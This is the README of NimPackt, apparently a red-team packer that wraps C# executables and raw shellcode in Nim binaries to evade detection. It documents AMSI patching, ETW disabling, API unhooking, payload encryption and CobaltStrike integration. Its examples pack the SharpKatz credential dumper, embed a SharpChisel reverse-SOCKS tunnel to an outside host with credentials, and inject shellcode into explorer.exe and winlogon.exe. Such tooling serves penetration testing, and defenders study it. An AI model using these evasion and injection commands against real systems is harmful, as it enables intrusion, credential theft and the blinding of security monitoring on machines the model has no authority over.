![NimPackt](assets/Nimpackt-Logo-Blacktext.png)

# A Nim-based packer for C# / .NET executables and raw shellcode

*By Cas van Cooten (@chvancooten)*

## Description

> ⚠ NimPackt is still under active development and will contain bugs/oversights/flaws. Though generated binaries should be OpSec-safe, please verify this yourself before deploying them in active engagements. Kthx.

NimPackt is a Nim-based packer for C# / .NET executables and raw shellcode. It automatically wraps these executables (along with its arguments) in a Nim binary that is compiled to Native C and as such harder to detect and reverse engineer. Currently, it has the following features.

- Compiles to `exe` or `dll` file
- Various execution methods: `execute-assembly`, `shinject` (local thread), `remoteShinject` (existing or sacrificial process)
- Unhooking User-mode APIs (`Ntdll`) using [ShellyCoat](https://github.com/slaeryan/AQUARMOURY/tree/master/Shellycoat)
- Disabling Event Tracing for Windows (ETW) (recommended for 'execute-assembly' method)
- Patching the Anti-Malware Scan Interface (AMSI) (recommended for 'execute-assembly' method)
- Payload encryption (AES-128 CTR) to prevent static analysis
- Obfuscating static strings used in the binary
- Supports cross-platform compilation (from both Linux and Windows)
- Supports both x64/x86 compilation (make sure to grab the right architecture for the ingested binary)
- Integrates with CobaltStrike for ezpz payload generation 😎

A great source for C#-based binaries for offensive tooling can be found [here](https://github.com/Flangvik/SharpCollection). It is highly recommended to compile the C# binaries yourself. Even though embedded binaries are encrypted, you should obfuscate sensitive binaries (such as Mimikatz) to lower the risk of detection.

If you want to go all-out on OpSec, you could re-pack the Nim binary using a tool like [PEzor](https://github.com/phra/PEzor) to re-pack the binary into position-independent shellcode and launch it from memory using CobaltStrike, though this is a bit beyond the purpose of NimPackt 😙

## Installation

On **Linux**, simply install the required packages and use the Nimble package installer to install the required packages and Python libraries.

```
sudo apt install -y python3 mingw-w64 nim
pip3 install pycryptodome argparse
nimble install winim nimcrypto
```

On **Windows**, execute the Nim installer from [here](https://nim-lang.org/install_windows.html). Make sure to install `mingw` and set the path values correctly using the provided `finish.exe` utility. If you don't have Python3 install that, then install the required packages as follows.

```
nimble install winim nimcrypto
pip3 install pycryptodome argparse
```

### CobaltStrike Plugin 

To install the CobaltStrike plugin, select `Cobalt Strike` -> `Script Manager` from the menu bar, and select `Load`. Make sure to load the `.cna` file from it's original location, otherwise it won't be able to find the NimPackt script files!

## Usage

```
usage: NimPackt.py [-h] -e EXECUTIONMODE -i INPUTFILE [-a [ARGUMENTS]] [-r] [-t INJECTTARGET] [-E] [-f FILETYPE] [-32] [-H] [-nu] [-na] [-ne] [-d] [-v] [-V]

required arguments:
  -e EXECUTIONMODE, --executionmode EXECUTIONMODE
                        Execution mode of the packer. Supports "execute-assembly" or "shinject"
  -i INPUTFILE, --inputfile INPUTFILE
                        C# .NET binary executable (.exe) or shellcode (.bin) to wrap

execute-assembly arguments:
  -a [ARGUMENTS], --arguments [ARGUMENTS]
                        Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (default)

shinject arguments:
  -r, --remote          Inject shellcode into remote process (default false)
  -t INJECTTARGET, --target INJECTTARGET
                        Remote thread targeted for remote process injection (default "explorer.exe", implies -r)
  -E, --existing        Remote inject into existing process rather than a newly spawned one (default false, implies -r) (WARNING: VOLATILE)

other arguments:
  -f FILETYPE, --filetype FILETYPE
                        Filetype to compile ("exe" or "dll", default: "exe")
  -32, --32bit          Compile in 32-bit mode
  -H, --hideapp         Hide the app frontend (console output) of executable by compiling it in GUI mode
  -nu, --nounhook       Do NOT unhook user-mode API hooks
  -na, --nopatchamsi    Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI) (recommended for shellcode)
  -ne, --nodisableetw   Do NOT disable Event Tracing for Windows (ETW) (recommended for shellcode)
  -d, --debug           Enable debug mode (retains .nim source file in output folder).
  -v, --verbose         Print debug messages of the wrapped binary at runtime
  -V, --version         show program's version number and exit
```

**Examples:**

```bash
# Pack SharpKatz to accept commands at runtime, patching hooks, AMSI, and ETW while printing verbose messages on runtime
python3 ./NimPackt.py -e execute-assembly -i bins/SharpKatz-x64.exe -v

# Pack SharpChisel with a built-in ChiselChief connection string, do not patch AMSI or disable ETW, hide the application window on runtime
python3 NimPackt.py -na -ne -H -e execute-assembly -i bins/SharpChisel.exe -a 'client --auth nimpackt.demo_A:718nubCpwiuLUW --keepalive 25s --max-retry-interval 25s https://chisel.azurewebsites.net R:10073:socks'

# Pack raw shellcode to DLL file that executes in the local thread without patching AMSI or ETW (generally not needed for shellcode)
# Shellcode generated with 'msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o /tmp/calc.bin'
python3 NimPackt.py -i calc.bin -e shinject -f dll -na -ne

# Pack raw shellcode to execute in a newly spawned Explorer thread (default), enabling verbose log messages in the compiled Nim binary
python3 NimPackt.py -i calc.bin -e shinject -na -ne -r -v

# Pack raw shellcode to execute in the existing Winlogon process (first PID with name 'winlogon.exe')
python3 NimPackt.py -i calc.bin -e shinject -na -ne -r -E -t "winlogon.exe"
```

Binaries are stored in the `output` subfolder of your installation directory. Generated `dll` files should be executed as follows:

```
rundll32 exampleShinjectNimPackt.dll,Update
```

## Known issues

- The `-H` flag doesn't seem to properly hide the output of the executed assembly when `execute-assembly` mode is used with `exe` files. This probably relates to C# compiling options, need to investigate this further.
- Shellcode doesn't seem to return correctly over all injection methods. This is generally not a problem for local injection (since the Nim thread can die anyway), but for remote injections it will in most instances cause the process to crash once the shellcode returns. For a sacrificial process this might be okay, but for existing processes (-E) this is not acceptable. Need to look into making shellcode properly return.

## Wishlist

- Provide option to evade sandbox fingerprinting (e.g. by performing calculations for 10-30s)
- Stabilize shellcode execution
- Fix "hard parsing" of arguments passed as embedded arguments (e.g. `-a '-arg=value'` not being accepted by `argparse`)
- Patch ETW by patching the actual function call (after Shellycoat) using [this method](https://gist.github.com/S3cur3Th1sSh1t/0f44b1a12c7eceb8f7be10799ba5018d)